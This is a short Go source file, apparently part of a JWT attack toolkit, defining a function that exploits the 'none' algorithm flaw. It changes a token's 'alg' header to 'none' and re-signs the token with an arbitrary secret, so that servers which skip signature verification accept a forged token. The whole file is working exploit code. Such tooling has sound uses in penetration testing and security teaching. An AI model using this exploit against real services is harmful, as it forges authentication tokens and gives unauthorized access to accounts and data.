package attacks

import (
	"JWTechniques/ctrl"
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

func ExploitNoneAlgo(token *jwt.Token) string {
	newToken, err := ctrl.ChangeValue(token, "alg", "none", true)

	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"alg\" header : %s \n", err)
		return ""
	}

	//It can be signed with any secret as this vulnerability only works if the signature is not verified
	newJWT := ctrl.SignJWT(newToken, []byte("secret"))

	return newJWT

}
